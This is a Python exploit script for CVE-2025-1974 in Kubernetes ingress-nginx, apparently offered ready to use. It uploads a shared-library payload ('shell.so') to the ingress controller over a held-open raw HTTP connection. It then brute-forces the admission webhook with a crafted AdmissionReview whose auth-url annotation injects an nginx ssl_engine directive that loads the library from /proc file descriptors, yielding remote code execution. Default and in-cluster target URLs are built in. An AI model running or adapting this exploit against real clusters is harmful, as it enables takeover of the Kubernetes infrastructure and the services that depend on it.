import base64
import time
import argparse
import requests
import sys
from urllib.parse import urlparse
import threading
from concurrent.futures import ThreadPoolExecutor
import urllib3
import socket
import os

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


admission_json = """
{
   "kind": "AdmissionReview",
   "apiVersion": "admission.k8s.io/v1",
   "request": {
      "uid": "3babc164-2b11-4c9c-976a-52f477c63e35",
      "kind": {
         "group": "networking.k8s.io",
         "version": "v1",
         "kind": "Ingress"
      },
      "resource": {
         "group": "networking.k8s.io",
         "version": "v1",
         "resource": "ingresses"
      },
      "requestKind": {
         "group": "networking.k8s.io",
         "version": "v1",
         "kind": "Ingress"
      },
      "requestResource": {
         "group": "networking.k8s.io",
         "version": "v1",
         "resource": "ingresses"
      },
      "name": "minimal-ingress",
      "namespace": "default",
      "operation": "CREATE",
      "userInfo": {
         "uid": "1619bf32-d4cb-4a99-a4a4-d33b2efa3bc6"
      },
      "object": {
         "kind": "Ingress",
         "apiVersion": "networking.k8s.io/v1",
         "metadata": {
            "name": "minimal-ingress",
            "namespace": "default",
            "creationTimestamp": null,
            "annotations": {
                "nginx.ingress.kubernetes.io/auth-url": "http://example.com/#;}}}\\n\\nssl_engine ../../../../../../../REPLACE\\n\\n"
            }
         },
         "spec": {
            "ingressClassName": "nginx",
            "rules": [
               {
                  "host": "test.example.com",
                  "http": {
                     "paths": [
                        {
                           "path": "/",
                           "pathType": "Prefix",
                           "backend": {
                              "service": {
                                 "name": "kubernetes",
                                 "port": {
                                    "number": 443
                                 }
                              }
                           }
                        }
                     ]
                  }
               }
            ]
         },
         "status": {
            "loadBalancer": {}
         }
      },
      "oldObject": null,
      "dryRun": true,
      "options": {
         "kind": "CreateOptions",
         "apiVersion": "meta.k8s.io/v1"
      }
   }
}
"""


def send_request(admission_url, json_data, proc, fd):
    print(f"Trying Proc: {proc}, FD: {fd}")
    path = f"proc/{proc}/fd/{fd}"
    replaced_data = json_data.replace("REPLACE", path)

    headers = {
        "Content-Type": "application/json"
    }

    full_url = admission_url.rstrip("/") + "/admission"

    try:
        response = requests.post(full_url, data=replaced_data, headers=headers, verify=False, timeout=1)
        # print(response.text) - use this to debug (check response of admission webhook)
        print(f"Response for /proc/{proc}/fd/{fd}: {response.status_code}")
    except Exception as e:
        print(f"Error on /proc/{proc}/fd/{fd}: {e}")


def admission_brute(admission_url, max_workers=10):
    # proc = input("INPUT PROC:") - use this for manual testing
    # fd = input("INPUT FD:") - use this for manual testing
    # send_request(admission_url, json_data, proc, fd) - use this for manual testing

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        for proc in range(30, 50):  # can be increased to 100
            for fd in range(3, 30):  # can be increased to 100 (not recommended)
                executor.submit(send_request, admission_url, admission_json, proc, fd)

        for proc in range(160, 180):  # can be increased to 100
            for fd in range(3, 30):  # can be increased to 100 (not recommended)
                executor.submit(send_request, admission_url, admission_json, proc, fd)


def exploit(ingress_url, shell_file):
    if not os.path.exists(shell_file):
        print(f"Error: Shell file '{shell_file}' not found")
        sys.exit(1)

    so = open(shell_file, 'rb').read() + b"\x00" * 8092

    real_length = len(so)
    fake_length = real_length + 10
    url = ingress_url

    parsed = urlparse(url)
    host = parsed.hostname
    port = parsed.port or 80
    path = parsed.path or "/"

    try:
        sock = socket.create_connection((host, port))
    except Exception as e:
        print(f"Error connecting to {host}:{port}: {e} - host is up?")
        sys.exit(1)
    
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: lufeisec\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Length: {fake_length}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    ).encode("iso-8859-1")

    http_payload = headers + so
    sock.sendall(http_payload)

    response = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk

    print("[*] Response:")
    print(response.decode(errors="ignore"))

    sock.close()


def parse_arguments():
    # Default values for the service
    default_admission = "https://localhost:32043/networking/v1/ingresses"
    default_ingress = "http://localhost:32080/fake/addr"
    
    # Suggested values when running in a kubernetes cluster
    suggested_admission = "https://ingress-nginx-controller-admission.ingress-nginx.svc:443/networking/v1/ingresses"
    suggested_ingress = "http://ingress-nginx-controller.ingress-nginx.svc/fake/addr"
    
    parser = argparse.ArgumentParser(description='CVE-2025-1974 Ingress-Nginx Exploit')
    
    parser.add_argument('-a', '--admission', 
                        default=default_admission, 
                        help=f'Admission webhook URL (default: {default_admission}, suggested in-cluster: {suggested_admission})')
    
    parser.add_argument('-i', '--ingress', 
                        default=default_ingress, 
                        help=f'Ingress controller URL (default: {default_ingress}, suggested in-cluster: {suggested_ingress})')
    
    parser.add_argument('-s', '--shell-file', 
                        default="shell.so", 
                        help='Path to the shell.so file (default: shell.so)')
    
    parser.add_argument('-w', '--workers', 
                        type=int, 
                        default=10, 
                        help='Number of worker threads for brute forcing (default: 10)')
    
    return parser.parse_args()


def main():
    args = parse_arguments()
    
    print(f"[*] Using shell file: {args.shell_file}")
    print(f"[*] Admission URL: {args.admission}")
    print(f"[*] Ingress URL: {args.ingress}")
    print(f"[*] Workers: {args.workers}")
    print("[*] Starting exploit...")
    
    # Send the library to the ingress pod and keep the connection open 
    # to keep the file open via the file descriptor (FD)
    x = threading.Thread(target=exploit, args=(args.ingress, args.shell_file))
    x.start()
    
    # Give the exploit thread time to start and upload the shellcode
    time.sleep(2)
    
    # Start the admission webhook brute force (/proc/{pid}/fd/{fd})
    admission_brute(args.admission, max_workers=args.workers)


if __name__ == "__main__":
    main()